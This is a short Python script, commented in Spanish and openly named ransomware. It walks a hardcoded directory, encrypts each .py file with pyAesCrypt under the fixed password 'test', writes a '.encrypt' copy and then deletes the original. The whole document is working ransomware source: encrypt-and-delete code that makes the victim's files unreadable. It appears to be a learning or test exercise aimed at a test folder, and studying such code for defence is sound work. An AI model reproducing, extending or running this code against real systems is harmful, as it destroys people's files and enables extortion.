#Created on 15/02/2019
#Author: Marco Alvarez M.
#Este programa es de opensource.
#Reconocimiento-NoComercial-CompartirtIgual
#Se puede distribuir y/o modificar siempre y cuando no sean con fines comerciales.

#Script que cifra archivos .py que se encuentran en una ruta, una vez cifrados se procede a borrar 
#los archivos originales.




import os
import pyAesCrypt

path = '/root/Documents/Python/Ransonware/test'
clave = "test"

class ransonware:
    
    def _init_(self):
        print("Public and Private Key RSA 2048")    

    def cifrar(self, clave, file, fileout=None):
        buffer=64*1024
        
        if not fileout:
            fileout=file+'.encrypt'
        size = os.path.getsize(file)
    
        with open(file, 'rb') as ifile:   
            with open(fileout,'wb') as ofile:
                print ("Encrypting",file)
                cifrando= pyAesCrypt.encryptStream(ifile, ofile, clave, buffer)
                print ("Encrypted successfull")
                print ("Deleting",file)
                

    
    
    def malware_infect(self):
        for root , dirName, fileList in os.walk(path):
            #  print('Found directory: %s' % dirName)
            for fname in fileList:
                print('Se va a cifrar: \t%s' % fname)
                if fname.endswith('.py'):
                    self.cifrar(clave,os.path.join(root,fname))
                    os.remove(os.path.join(root, fname)) 
                    print('Deleted file successful: \t%s' % fname)



def main():
    malware=ransonware()
    malware.malware_infect()
    
if __name__ == "__main__":
    main()



    
             
